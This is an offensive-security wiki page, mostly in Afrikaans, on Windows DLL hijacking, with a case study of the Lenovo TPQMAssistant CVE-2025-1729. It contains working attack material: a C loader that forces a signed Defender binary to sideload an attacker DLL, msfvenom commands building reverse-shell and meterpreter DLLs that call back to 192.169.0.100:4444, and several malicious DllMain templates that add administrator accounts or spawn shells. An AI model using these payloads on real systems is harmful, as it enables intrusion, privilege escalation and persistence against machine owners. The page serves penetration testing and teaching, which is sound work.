# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing sodat dit 'n kwaadwillige DLL laai. Hierdie term omvat verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistensie te bereik, en, minder algemeen, privilege escalation. Ondanks die fokus op escalation hier, bly die metode van hijacking oor doelwitte heen konsekwent.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk met sy eie effektiwiteit afhangend van die toepassing se DLL-laaistrategie:

1. **DLL Replacement**: Die uitruiling van 'n egte DLL met 'n kwaadwillige een, opsioneel deur DLL Proxying te gebruik om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Die plaas van die kwaadwillige DLL in 'n soekpad wat voor die legitieme een kom, en sodoende die toepassing se soekpatroon uitbuit.
3. **Phantom DLL Hijacking**: Die skep van 'n kwaadwillige DLL vir 'n toepassing om te laai, terwyl dit dink dit laai 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Die wysiging van soekparameters soos %PATH% of .exe.manifest / .exe.local lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Die vervanging van die legitieme DLL met 'n kwaadwillige teenhanger in die WinSxS-gids, 'n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Die plaas van die kwaadwillige DLL in 'n gebruikerbeheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution-tegnieke.

## Om ontbrekende Dlls te vind

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop, en die **volgende 2 filters** te stel:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy na **ontbrekende dlls in die algemeen** soek, laat dit vir 'n paar **sekondes** loop.\
As jy 'n **ontbrekende dll binne 'n spesifieke executable** soek, stel 'n **ander filter soos "Process Name" "contains" "\<exec name>", voer dit uit, en stop die vaslegging van events**.

## Uitbuiting van Ontbrekende Dlls

Om privileges te eskaleer, is die beste kans wat ons het om 'n **dll te kan skryf wat 'n privilege process sal probeer laai** in een van die **plekke waar dit gaan gesoek word**. Daarom kan ons 'n **dll skryf** in 'n **gids** waar die **dll gesoek word voordat** dit in die gids met die **oorspronklike dll** gevind word (vreemde geval), of ons kan skryf in 'n **gids waar die dll gesoek gaan word** en die oorspronklike **dll nie in enige gids bestaan nie**.

### Dll Soekorde

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** soek vir DLLs deur 'n stel voorafbepaalde soekpaaie te volg, in 'n spesifieke volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paths gebruik wanneer dit na die DLLs verwys wat dit benodig.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, maak die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (standaard is dit geaktiveer).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Laastens, let daarop dat **'n dll gelaai kan word deur die absolute path aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, gaan hulle gesoek word soos gewoonlik deur naam).

Daar is ander maniere om die soekorde te verander maar ek gaan nie daarop hier ingaan nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

'n Gevorderde manier om deterministies die DLL-soekpad van 'n nuut geskepte proses te beïnvloed is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses geskep word met ntdll se native APIs. Deur 'n aanvalbeheer-gids hieraan te voorsien, kan 'n teikenproses wat 'n geïmporteerde DLL by naam oplos (geen absolute pad en nie die veilige laai-vlae gebruik nie) gedwing word om 'n kwaadwillige DLL uit daardie gids te laai.

Belangrike idee
- Bou die process parameters met RtlCreateProcessParametersEx en voorsien 'n pasgemaakte DllPath wat na jou beheer-gids wys (bv. die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary 'n DLL by naam oplos, sal die loader hierdie voorsiene DllPath oorweeg tydens resolusie, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE gekolloceer is nie.

Notas/beperkings
- Dit beïnvloed die kindproses wat geskep word; dit is anders as SetDllDirectory, wat slegs die huidige proses beïnvloed.
- Die teiken moet 'n DLL by naam importeer of met LoadLibrary laai (geen absolute pad en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardgekodeerde absolute paths kan nie gehijack word nie. Forwarded exports en SxS kan prioriteit verander.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operasionele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of na die regte een proxieer) in jou DllPath-gids.
- Start 'n ondertekende binary wat bekend is daarvoor dat dit xmllite.dll per naam opsoek met bogenoemde tegniek. Die loader los die import op via die verskafte DllPath en sideloads jou DLL.

Hierdie tegniek is in die natuur waargeneem om multi-stadium sideloading-kettings aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-signed, hijackable binary met 'n pasgemaakte DllPath spawnee om te dwing dat die aanvaller se DLL vanaf 'n staging-gids gelaai word.


#### Exceptions on dll search order from Windows docs

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat sy naam deel met een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit terugval op die DLL wat reeds in geheue is. **In hierdie scenario voer die stelsel nie 'n soektog vir die DLL uit nie**.
- In gevalle waar die DLL erken word as 'n **known DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLL's, **en die soekproses ter syde stel**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volle pad geïdentifiseer is.

### Eskalering van voorregte

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende voorregte** (horizontale of laterale beweging) werk of sal werk, wat **'n DLL ontbreek**.
- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind aangesien dit **by default 'n bietjie vreemd is om 'n bevoorregte uitvoerbare lêer te vind wat 'n dll ontbreek** en dit is selfs **meer vreemd om skryftoestemmings te hê op 'n stelselpad-gids** (jy kan dit nie by verstek hê nie). Maar, in verkeerd gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs as die **hoofdoel van die projek is bypass UAC**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryfperms het te verander).

Let wel dat jy kan **jou toestemmings in 'n gids nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die permissies van alle vouers in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om Dll Hijacking te misbruik om bevoegdhede te verhoog wanneer jy skryftoestemming het in 'n **System Path folder**, sien:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal kontroleer of jy skryftoestemmings het op enige gids binne system PATH.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

As jy 'n uitbuitbare scenario vind, is een van die belangrikste dinge om dit suksesvol uit te buit om **'n dll te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daaruit sal invoer**. Let wel dat Dll Hijacking handig is om te [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** in hierdie dll hijacking-studie gefokus op dll hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **volgende afdeling** kan jy 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie-vereiste funksies geëksporteer** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om te **eksponeer** en te **werk** soos verwag deur **alle oproepe na die regte biblioteek deur te stuur**.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86; ek het nie 'n x64-weergawe gesien nie):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let wel dat in verskeie gevalle die Dll wat jy compile, moet **export several functions** wat deur die victim process gelaai gaan word. As hierdie functions nie bestaan nie, sal die **binary won't be able to load** hulle en sal die **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Gevalstudie: CVE-2025-1729 - Privilege Escalation met TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), wat opgespoor is as **CVE-2025-1729**.

### Kwesbaarheidsbesonderhede

- **Component**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hardloop daagliks om 9:30 AM onder die konteks van die aangemelde gebruiker.
- **Directory Permissions**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers in staat stel om ewekansige lêers neer te sit.
- **DLL Search Behavior**: Poog eers om `hostfxr.dll` vanaf sy werkgids te laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat plaaslike gidssoektog voorkeur geniet.

### Implementering van die uitbuiting

'n Aanvaller kan 'n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas, en die ontbrekende DLL benut om code execution onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsvloei

1. As 'n standaard gebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 AM onder die huidige gebruiker se konteks loop.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, sal die kwaadwillige DLL in die administrateur se sessie loop by medium integrity.
4. Koppel standaard UAC bypass techniques om van medium integrity na SYSTEM privileges te eskaleer.

### Mitigasie

Lenovo het UWP weergawe **1.12.54.0** via die Microsoft Store vrygestel, wat TPQMAssistant installeer onder `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, die kwesbare geskeduleerde taak verwyder, en die legacy Win32-komponente deïnstalleer.

## Verwysings

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
